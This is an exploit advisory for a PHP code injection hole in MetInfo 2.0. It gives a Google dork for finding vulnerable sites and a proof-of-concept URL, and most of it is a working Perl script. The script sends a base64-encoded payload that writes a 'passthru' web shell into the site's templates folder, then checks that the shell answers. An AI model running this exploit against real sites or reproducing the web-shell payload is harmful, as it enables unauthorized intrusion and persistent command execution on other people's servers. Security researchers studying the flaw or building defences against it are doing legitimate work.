#####################################################################################################
#Exploit Title��MetInfo 2.0 PHP Code Injection Vulnerability
#Date:2010-10-31
#Author��linux520.com
#Team��http://www.linux520.com/
#Vendor��http://www.metinfo.cn/
#Dork��"Powered by  MetInfo  2.0 "  #    Google: 90,000 + results
#Price�� free
#Language��PHP
#Greetz��CCAV
#####################################################################################################
+Description��
at 132 line of  ROOTPATH/include/common.inc.php:

eval(base64_decode($class2_all_1[0])); 

$class2_all_1[0]  is not defined ��so we can inject eval php code
#####################################################################################################
+POC��http://victim.com/include/common.inc.php?$class2_all_1[0]=[base64_encode(eval php code)]
#####################################################################################################
+Exploit:

#!/usr/bin/env perl

use LWP::UserAgent;
print "################################################################\n";
print "#              MetInfo 2.0 c0de inj3cti0n 3xplo!t              #\n";
print "#                         by:linux520.com                      #\n";
print "################################################################\n";

die "Usage: $0 <target site> Ex:$0 victim.com\n" unless($ARGV[0]);
my $victim = $ARGV[0];
$user_agent = new LWP::UserAgent;
$vul_request = new HTTP::Request('GET',"http://$victim/include/common.inc.php?$class2_all_1[0]=ZnB1dHMoZm9wZW4oJy4uL3RlbXBsYXRlcy90ZXN0LnBocCcsJ3crJyksJzw/cGhwIHBhc3N0aHJ1KCRfR0VUW2NtZF0pPz4nKTs=");
# fputs(fopen('../templates/test.php','w+'),'<?php passthru($_GET[cmd]);?>');
$user_agent->request($vul_request);
$response = $user_agent->request(new HTTP::Request('GET',"http://$victim/templates/test.php"));
if($response->is_success)
{
	print "code injection successful ! plz look at http://$victim/templates/test.php?cmd=id";
}
else
{
print "could not connect to $victim";
}
#####################################################################################################